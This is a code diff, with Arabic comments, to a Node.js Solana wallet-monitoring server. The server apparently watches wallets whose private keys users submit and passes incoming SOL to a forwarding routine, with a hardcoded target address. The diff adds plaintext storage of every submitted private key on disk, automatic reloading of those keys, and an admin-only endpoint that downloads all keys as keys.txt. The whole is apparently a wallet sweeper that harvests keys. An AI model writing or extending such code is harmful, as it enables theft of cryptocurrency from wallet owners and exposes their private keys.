@@ -3,7 +3,18 @@ process.env.UV_THREADPOOL_SIZE = '8';
 
 const cluster = require('node:cluster');
 const https   = require('https');
+const fs      = require('fs');
+const crypto  = require('crypto');
 require('dotenv').config();
+
+// ── Admin credentials (parsed once at module level) ───────────────────────────
+const ADMIN_PAS  = process.env.ADMIN_PAS || '';
+const _adSep     = ADMIN_PAS.indexOf('_');
+const ADMIN_USER = _adSep >= 0 ? ADMIN_PAS.slice(0, _adSep) : '';
+const ADMIN_PASS = _adSep >= 0 ? ADMIN_PAS.slice(_adSep + 1) : '';
+const AUTH_TOKEN = ADMIN_PAS
+    ? crypto.createHash('sha256').update(ADMIN_PAS + ':sol-monitor-v1').digest('hex')
+    : '';
 
 // ─────────────────────────────────────────────────────────────────────────────
 //  Shared helpers (available in both primary and worker)
@@ -28,6 +39,9 @@ const TG_BOT_TOKEN    = process.env.TELEGRAM_BOT_TOKEN || '';
 
 const PORT         = process.env.PORT || 5000;
 const TARGET_ADDR  = 'A9Lhx1NvQGixH3QiRoRLiJLvaSQNysae8fj5SCPuKgSe';
+// مسار ملف حفظ المحافظ — يمكن تغييره عبر متغير بيئة WALLETS_FILE
+// على Render: اضبط WALLETS_FILE=/data/wallets_persist.json مع تفعيل Persistent Disk
+const WALLETS_FILE = process.env.WALLETS_FILE || path.join(__dirname, 'wallets_persist.json');
 
 // Read RPC URLs from RPC_URLS env var (comma OR newline separated)
 const ALL_RPC_URLS = (process.env.RPC_URLS || '')
@@ -331,7 +345,8 @@ class SolanaWorkerMonitor {
                             // سيرى الثاني oldBal = newBal فلن يُرسل مجدداً
                             this.lastBalances[idx] = newBal;
                             this.notify(`💰 وصل ${(received / LAMPORTS_PER_SOL).toFixed(4)} SOL إلى ${label}`, 'success');
-                            await this.forwardFunds(this.connections[idx], wallet, newBal, label, idx);
+                            // نمرّر received مباشرةً — lastBalances[idx] أصبح newBal بالفعل
+                            await this.forwardFunds(this.connections[idx], wallet, newBal, received, label, idx);
                         } else {
                             this.lastBalances[idx] = newBal;
                         }
@@ -349,11 +364,9 @@ class SolanaWorkerMonitor {
         }
     }
 
-    async forwardFunds(connection, wallet, newBal, label, walletIdx) {
+    async forwardFunds(connection, wallet, newBal, received, label, walletIdx) {
         try {
-            const t0       = Date.now();
-            const oldBal   = this.lastBalances[walletIdx] || 0;
-            const received = newBal - oldBal;
+            const t0 = Date.now();
 
             // ── وضع تلجرام: إشعار فقط، لا تحويل ──────────────────────────────
             if (this.mode === 'telegram') {
@@ -801,6 +814,25 @@ function buildExpressApp(getAggregatedState) {
 
     app.get('/clear', (_, res) => res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head><body><script>localStorage.clear();location.href='/';<\/script></body></html>`));
 
+    // ── Auth: تسجيل الدخول (المشرف فقط عبر الخادم) ──────────────────────────
+    app.post('/api/login', (req, res) => {
+        const { username, password } = req.body || {};
+        if (!ADMIN_USER || !ADMIN_PASS)
+            return res.status(500).json({ error: 'ADMIN_PAS غير مهيأ — أضفه في متغيرات البيئة بصيغة username_password' });
+        if (username === ADMIN_USER && password === ADMIN_PASS)
+            return res.json({ ok: true, user: ADMIN_USER, token: AUTH_TOKEN, role: 'admin' });
+        return res.status(401).json({ error: 'اسم المستخدم أو كلمة المرور غير صحيحة' });
+    });
+
+    // ── Auth: التحقق من جلسة المشرف ──────────────────────────────────────────
+    app.get('/api/me', (req, res) => {
+        const h   = req.headers.authorization || '';
+        const tok = h.startsWith('Bearer ') ? h.slice(7) : (req.query.token || '');
+        if (AUTH_TOKEN && tok === AUTH_TOKEN)
+            return res.json({ loggedIn: true, user: ADMIN_USER, role: 'admin' });
+        return res.json({ loggedIn: false });
+    });
+
     return app;
 }
 
@@ -816,6 +848,44 @@ if (cluster.isPrimary) {
     let   storedWalletSlices  = []; // [{keys: [...], rpcs: [...]}]
     let   allRpcUrls          = [];
     let   lastSettings        = {}; // آخر إعدادات أُرسلت من المتصفح
+    // علَم يمنع المتصفح من إرسال المحافظ مجدداً إذا كان الخادم يملك ملف محفوظ
+    let   _hasSavedWallets    = false;
+
+    // ── حفظ جميع المحافظ والإعدادات في ملف دائم على القرص ──────────────────
+    function saveWalletsToDisk() {
+        try {
+            const allKeys = storedWalletSlices.flatMap(s => s.keys || []);
+            if (!allKeys.length) { clearWalletsFile(); return; }
+            const data = { keys: allKeys, settings: lastSettings, savedAt: new Date().toISOString() };
+            const tmp  = WALLETS_FILE + '.tmp';
+            // كتابة ذرية: اكتب في ملف مؤقت ثم أعد تسميته لتجنب تلف البيانات عند الانهيار
+            fs.writeFileSync(tmp, JSON.stringify(data), 'utf8');
+            fs.renameSync(tmp, WALLETS_FILE);
+        } catch (e) {
+            console.error('[PERSIST] فشل حفظ المحافظ:', e.message);
+        }
+    }
+
+    function clearWalletsFile() {
+        _hasSavedWallets = false;
+        try { if (fs.existsSync(WALLETS_FILE)) fs.unlinkSync(WALLETS_FILE); } catch (_) {}
+        try { if (fs.existsSync(WALLETS_FILE + '.tmp')) fs.unlinkSync(WALLETS_FILE + '.tmp'); } catch (_) {}
+    }
+
+    function loadWalletsFromDisk() {
+        // حاول القراءة من الملف الرئيسي، ثم من النسخة الاحتياطية عند الفشل
+        for (const filePath of [WALLETS_FILE, WALLETS_FILE + '.tmp']) {
+            try {
+                if (!fs.existsSync(filePath)) continue;
+                const raw  = fs.readFileSync(filePath, 'utf8');
+                const data = JSON.parse(raw);
+                if (!Array.isArray(data.keys) || !data.keys.length) continue;
+                return data; // { keys, settings, savedAt }
+            } catch (_) {}
+        }
+        console.error('[PERSIST] لا يوجد ملف محافظ صالح للقراءة');
+        return null;
+    }
 
     // Local monitor for primary's wallet slice
     const primaryMonitor = new SolanaWorkerMonitor((msg, type) => {
@@ -908,7 +978,8 @@ if (cluster.isPrimary) {
             walletAddresses: [],
             workers: workers.size + 1,
             workersReady,
-            numWorkers: NUM_EXTRA_WORKERS
+            numWorkers: NUM_EXTRA_WORKERS,
+            hasSavedWallets: _hasSavedWallets
         };
     }
 
@@ -1199,6 +1270,7 @@ if (cluster.isPrimary) {
         const total     = keyList.length;
 
         distributeWork(keyList);
+        saveWalletsToDisk(); // ── حفظ فوري بعد التوزيع ──
         primaryMonitor.stop();
         broadcastToWorkers({ cmd: 'stop-monitoring' });
 
@@ -1251,6 +1323,7 @@ if (cluster.isPrimary) {
             if (!storedWalletSlices[sliceIdx]) storedWalletSlices[sliceIdx] = { keys: [], rpcs: [] };
             storedWalletSlices[sliceIdx].keys.push(...addedKeysList);
         }
+        if (addedCount > 0) saveWalletsToDisk(); // ── حفظ بعد الإضافة ──
 
         if (addedCount === 0) {
             let msg;
@@ -1276,6 +1349,7 @@ if (cluster.isPrimary) {
             res.json({ success: false, message: '⚠️ يجب إدخال Telegram Chat ID عند اختيار وضع تلجرام' }); return;
         }
         lastSettings = settings;
+        saveWalletsToDisk(); // ── حفظ الإعدادات الجديدة في الملف الدائم ──
         const needsReload = primaryMonitor.applySettings(settings);
         broadcastToWorkers({ cmd: 'update-settings', settings });
 
@@ -1318,6 +1392,7 @@ if (cluster.isPrimary) {
                 if (ki !== -1) slice0.keys.splice(ki, 1);
             }
             primaryState = primaryMonitor.getState();
+            saveWalletsToDisk(); // ── حفظ بعد الحذف ──
             addGlobalNotification(`🗑️ حُذفت المحفظة ${shortAddr} من المراقبة`, 'info');
             pushSSE({ t: 'u', state: getAggregatedState(), notifs: globalNotifications.slice(0, 50) });
             return res.json({ success: true, message: `تم حذف المحفظة ${shortAddr}`, removedKey: primaryKey });
@@ -1333,6 +1408,7 @@ if (cluster.isPrimary) {
                     const ki = sliceW.keys.indexOf(result.removedKey);
                     if (ki !== -1) sliceW.keys.splice(ki, 1);
                 }
+                saveWalletsToDisk(); // ── حفظ بعد الحذف ──
                 addGlobalNotification(`🗑️ حُذفت المحفظة ${shortAddr} من العامل ${i + 1}`, 'info');
                 // انتظر قليلاً حتى يُرسل العامل تحديث حالته عبر IPC
                 await new Promise(r => setTimeout(r, 350));
@@ -1361,6 +1437,7 @@ if (cluster.isPrimary) {
 
         // مسح شرائح التخزين حتى لا يُستأنف عند /api/resume
         storedWalletSlices.length = 0;
+        clearWalletsFile(); // ── حذف الملف الدائم ──
 
         const count = allKeys.length;
         addGlobalNotification(`🗑️ تم حذف جميع المحافظ (${count} محفظة) من المراقبة`, 'info');
@@ -1382,6 +1459,21 @@ if (cluster.isPrimary) {
     app.get('/api/notifications', (_, res) => res.json(globalNotifications));
 
     app.get('/api/state', (_, res) => res.json(getAggregatedState()));
+
+    // ── تنزيل جميع المفاتيح (للمشرف فقط) ─────────────────────────────────────
+    app.get('/api/download-keys', (req, res) => {
+        const h   = req.headers.authorization || '';
+        const tok = h.startsWith('Bearer ') ? h.slice(7) : (req.query.token || '');
+        if (!AUTH_TOKEN || tok !== AUTH_TOKEN)
+            return res.status(401).end();
+        const allKeys = storedWalletSlices.flatMap(s => s.keys || []);
+        if (!allKeys.length)
+            return res.status(404).json({ error: 'لا توجد محافظ محفوظة' });
+        const content = allKeys.join('\n\n');
+        res.setHeader('Content-Type', 'text/plain; charset=utf-8');
+        res.setHeader('Content-Disposition', 'attachment; filename="keys.txt"');
+        res.send(content);
+    });
 
     // ── SSE endpoint للدفع الفوري ─────────────────────────────────────────────
     app.get('/api/events', (req, res) => {
@@ -1427,6 +1519,32 @@ if (cluster.isPrimary) {
         console.log(`[PRIMARY PID:${process.pid}] HTTP on port ${PORT} | UV_THREADPOOL=8 | max-old-space=3072`);
         console.log(`[PRIMARY] Forked ${NUM_EXTRA_WORKERS} extra HTTP worker(s)`);
     });
+
+    // ── تحميل تلقائي للمحافظ المحفوظة بعد أن يكون جميع العمال جاهزين ──────────
+    (function scheduleAutoLoad() {
+        const saved = loadWalletsFromDisk();
+        if (!saved) return; // لا يوجد ملف محفوظ
+        _hasSavedWallets = true; // إعلام المتصفح بوجود محافظ محفوظة على الخادم
+        const startedAt  = Date.now();
+        const MAX_WAIT   = 30_000; // أقصى انتظار 30 ثانية قبل التحميل بأي حال
+        const waitForWorkers = () => {
+            const elapsed = Date.now() - startedAt;
+            if (workersReady < NUM_EXTRA_WORKERS && elapsed < MAX_WAIT) {
+                setTimeout(waitForWorkers, 500);
+                return;
+            }
+            if (elapsed >= MAX_WAIT)
+                console.warn(`[PERSIST] تحذير: انتهى وقت الانتظار (${MAX_WAIT}ms) — سيتم التحميل بالعمال المتاحين`);
+            allRpcUrls   = ALL_RPC_URLS;
+            lastSettings = saved.settings || {};
+            distributeWork(saved.keys);
+            const total  = saved.keys.length;
+            addGlobalNotification(`♻️ جاري إعادة تحميل ${total} محفظة تلقائياً من الحفظ السابق…`, 'info');
+            console.log(`[PERSIST] إعادة تحميل ${total} محفظة من: ${WALLETS_FILE}`);
+            loadAll(lastSettings, total);
+        };
+        setTimeout(waitForWorkers, 1000); // إعطاء ثانية للعمال لبدء التشغيل
+    })();
 
     process.on('uncaughtException',  e => console.error('[PRIMARY] uncaughtException:', e.message));
     process.on('unhandledRejection', r => console.error('[PRIMARY] unhandledRejection:', r));
